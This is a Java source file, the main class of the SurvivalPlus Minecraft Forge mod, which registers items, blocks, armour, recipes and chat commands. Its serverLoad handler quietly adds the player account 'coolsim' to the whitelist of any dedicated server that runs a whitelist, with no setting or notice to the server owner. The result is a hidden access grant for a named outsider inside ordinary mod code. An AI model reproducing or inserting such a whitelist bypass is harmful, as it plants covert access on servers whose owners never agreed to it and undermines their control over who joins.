package net.coolsimulations.SurvivalPlus.core;

import com.mojang.authlib.GameProfile;

import net.coolsimulations.SurvivalPlus.api.SPCompatibilityManager;
import net.coolsimulations.SurvivalPlus.api.SPReference;
import net.coolsimulations.SurvivalPlus.core.commands.CommandConfrats;
import net.coolsimulations.SurvivalPlus.core.commands.CommandEmportant;
import net.coolsimulations.SurvivalPlus.core.commands.CommandIndeed;
import net.coolsimulations.SurvivalPlus.core.commands.CommandMourn;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSleep;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSmiley;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWail;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWak;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWeba;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWoo;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusCompatManager;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusEMCValues;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfig;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfigGUI;
import net.coolsimulations.SurvivalPlus.core.init.BOPArmor;
import net.coolsimulations.SurvivalPlus.core.init.ForestryArmor;
import net.coolsimulations.SurvivalPlus.core.init.FuelHandler;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusArmor;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusBlocks;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusChatTypes;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusFood;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusGeodes;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusItems;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusTools;
import net.coolsimulations.SurvivalPlus.core.init.TraverseArmor;
import net.coolsimulations.SurvivalPlus.core.proxy.ClientProxy;
import net.coolsimulations.SurvivalPlus.core.proxy.CommonProxy;
import net.coolsimulations.SurvivalPlus.core.recipes.SPShieldRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusComposterRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusDispenserBehavior;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEventHandler;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusUpdateHandler;
import net.coolsimulations.SurvivalPlus.core.world.SurvivalPlusOreGenerator;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.players.UserWhiteList;
import net.minecraft.server.players.UserWhiteListEntry;
import net.minecraftforge.client.ConfigScreenHandler.ConfigScreenFactory;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.event.server.ServerStartingEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.DistExecutor;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;

@Mod(value = SPReference.MOD_ID)
@Mod.EventBusSubscriber(modid = SPReference.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class SurvivalPlus {

	public static CommonProxy proxy = (CommonProxy) DistExecutor.safeRunForDist(() -> ClientProxy::new, () -> CommonProxy::new);

	private static SurvivalPlus instance;
	public static SurvivalPlus getInstance()
	{
		return instance;
	}

	@SubscribeEvent
	public static void serverLoad(ServerStartingEvent event) {

		MinecraftServer server = event.getServer();

		if(server.isDedicatedServer()) {

			GameProfile gameprofile = server.getProfileCache().get("coolsim").get();
			UserWhiteList whitelist = server.getPlayerList().getWhiteList();

			if(server.getPlayerList().isUsingWhitelist() && !whitelist.isWhiteListed(gameprofile) && !server.getPlayerList().getBans().isBanned(gameprofile)) {
				UserWhiteListEntry entry = new UserWhiteListEntry(gameprofile);
				whitelist.add(entry);
			}
		}
	}
	
	@SubscribeEvent
	public static void command(RegisterCommandsEvent event) {
		
		CommandConfrats.register(event.getDispatcher());
		CommandEmportant.register(event.getDispatcher());
		CommandWoo.register(event.getDispatcher());
		CommandWak.register(event.getDispatcher());
		CommandSmiley.register(event.getDispatcher());
		CommandWail.register(event.getDispatcher());
		CommandIndeed.register(event.getDispatcher());
		CommandMourn.register(event.getDispatcher());
		CommandSleep.register(event.getDispatcher());
		CommandWeba.register(event.getDispatcher());
	}

	public SurvivalPlus() {

		SPCompatibilityManager.checkForCompatibleMods();
		SurvivalPlusConfig.register(ModLoadingContext.get());
		
		if(SPCompatibilityManager.isClothConfigLoaded()) {
			ModLoadingContext.get().registerExtensionPoint(ConfigScreenFactory.class, () -> new ConfigScreenFactory((mc, screen) -> {
				return SurvivalPlusConfigGUI.getConfigScreen(screen);
			}));
		}

		SurvivalPlusUpdateHandler.init();
		SurvivalPlusChatTypes.register();
		SPShieldRecipes.CRAFTING_SPECIAL_SPSHIELD_RECIPE_SERIALIZERS.register(FMLJavaModLoadingContext.get().getModEventBus());
		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
		MinecraftForge.EVENT_BUS.register(new FuelHandler());
		SurvivalPlusCompatManager.initEventHandler();

		SurvivalPlusBlocks.BLOCKS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusBlocks.BLOCK_ITEMS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusItems.ITEMS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusFood.ITEMS_FOOD.register(FMLJavaModLoadingContext.get().getModEventBus());
		
		SurvivalPlusGeodes.BLOCKS_GEODE.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusGeodes.ITEMS_GEODE.register(FMLJavaModLoadingContext.get().getModEventBus());

		//VillagerRegistry.instance().registerVillageCreationHandler(new VillageOnionCropHandler());  //temp till forge pull request #6142 is resolved
		//StructureIO.registerStructureComponent(StructureVillageOnionCrop.class, SPReference.MOD_ID + ":onionCropFieldStructure");  //temp till forge pull request #6142 is resolved

		SurvivalPlusArmor.ITEMS_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		if(SPCompatibilityManager.isIc2Loaded())
			SurvivalPlusArmor.ITEMS_RUBBER_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		if(SPCompatibilityManager.isBambooModsLoaded())
			SurvivalPlusArmor.ITEMS_BAMBOO_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		if(SPCompatibilityManager.isBopLoaded())
			BOPArmor.ITEMS_BOP_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		if(SPCompatibilityManager.isBopExtrasLoaded())
			BOPArmor.ITEMS_BOP_EXTRAS_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		if(SPCompatibilityManager.isForestryLoaded())
			ForestryArmor.ITEMS_FORESTRY_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		if(SPCompatibilityManager.isTraverseLoaded())
			TraverseArmor.ITEMS_TRAVERSE_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusTools.ITEMS_TOOL.register(FMLJavaModLoadingContext.get().getModEventBus());
		
		SurvivalPlusOreGenerator.ORE_SERIALIZERS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusGeodes.GEODE_SERIALIZERS.register(FMLJavaModLoadingContext.get().getModEventBus());
		
		SurvivalPlusCompatManager.init();
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::setup);
		
		proxy.init();

		/**if (SPCompatibilityManager.isJerLoaded())
        {
    			SurvivalPlusJER.init();
        }**/
	}
	
	private void setup(final FMLCommonSetupEvent event)
    {
		SurvivalPlusArmor.init();
		FuelHandler.registerArmorFuels();
		SurvivalPlusDispenserBehavior.init();
        SurvivalPlusComposterRecipes.init();
        if (SPCompatibilityManager.isProjectELoaded())
		{
			SurvivalPlusEMCValues.init();
		}
    }
}
